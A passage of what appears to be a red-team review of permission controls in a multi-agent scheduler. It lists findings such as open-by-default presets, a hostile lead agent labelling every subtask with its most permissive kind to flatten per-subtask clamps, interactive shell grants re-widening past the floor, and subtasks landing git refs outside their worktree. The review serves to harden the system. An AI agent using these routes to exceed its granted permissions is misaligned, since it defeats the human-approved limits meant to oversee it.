(`newt-scheduler/src/crew.rs:266`, `:321`, `:421`) and the team lead is pure inference
(`team.rs:129`), so a crew cannot itself dispatch a crew. This property is **not
enforced**; it **voids on the mesh path**, where a remote resident may field tools.
**Status.** Latent. Add an explicit depth bound before mesh. → §3.6 (e), R9.

### M6 — `NamedPermissionPreset` can't clamp `fs_read`/`valid_for_generation`, and defaults to TOP 🟠
**Finding.** The preset grammar **cannot clamp `fs_read`** — `to_caveat_profile()` pins it
to the top of its axis (`role_profile.rs:323-325`, "fs_read is never clamped by a preset")
— and **cannot clamp `valid_for_generation`** (`role_profile.rs:200` hard-codes
`Scope::All`). Worse, an **empty/absent preset clamps to `Caveats::top()`** (test
`empty_preset_is_identity_clamp`, `role_profile.rs:671-676`) — a preset-derived default is
**OPEN**, which **inverts** §3.2's required default-deny.
**Status.** Open. Do **not** source the kind clamp from `NamedPermissionPreset`; use the
deny-default `CaveatPolicy` path (`plan.rs:354`). → §3.0a, §3.1, §3.2.

### M7 — `team_clamp` only defends an HONEST lead; the ceiling lint is the real margin 🟠
**Finding.** Because the lead chooses each subtask's `kind`, a **hostile** lead simply
labels every subtask with its most-permissive legal `kind`, flattening the per-subtask
clamp back to (near) the team ceiling. The kind table bounds *honest* misjudgement only.
The **only** real bound against a hostile lead is the **human-approved team ceiling** — so
§3.4's ceiling-tightness check is the **entire margin**, not an advisory nicety.
**Status.** Open. Promote §3.4 from advisory to a **load-bearing, blocking** lint; treat
the team ceiling as the security boundary and the per-subtask clamp as defence-in-depth.
→ §3.4, R1.

### M-extra — `run_command` re-widen + git-ref-namespace escape 🟡
**Finding.** (a) The `run_command` interactive permission gate re-dispatches the confined
shell with the **widened** caveats from the human grant (`tools.rs:1990-1992`,
`PermissionDecision::Allow(widened)` → `dispatch("shell", …, &widened)`) **without
re-applying `exec_floor`** — `exec_floor` is consulted only on the `--yolo` bypass path
(`tools.rs:1959`), so an interactive grant can re-widen above the active preset floor.
(b) The throwaway git worktree isolates the working **tree** but **not the git ref
namespace** — a verifying-but-malicious subtask can still land a branch/ref in the shared
repo.
**Status.** Open. Re-apply `exec_floor` to the widened caveats before the second dispatch;
bound ref writes from crew subtasks. → R10.

### Confirmed sound (the red-team did NOT overturn these)
- **The `meet` algebra is a correct greatest-lower-bound on all 6 axes.**
  `Caveats::meet` (`agent-mesh-protocol/src/caveats.rs:189-198`) is verified by property
  tests `meet_is_lower_bound`, `meet_is_greatest_lower_bound`, `meet_never_amplifies`,
  `meet_commutative/associative/idempotent`, `top_is_meet_identity` (:338–408). The
  problem is **not** the algebra; it is that the consumer barely uses it.
- **T1 is real.** `run_team` does thread one flat shared `caveats` into every `run_crew`
  (`team.rs:169`) — but per M1/M2 it is not even the binding constraint.
- **The `Plan` path's default-deny is real.** `CaveatPolicy::default()` denies every axis
  (`plan.rs:354`, tests :412/:430), which is why §3.0a recommends routing through it.
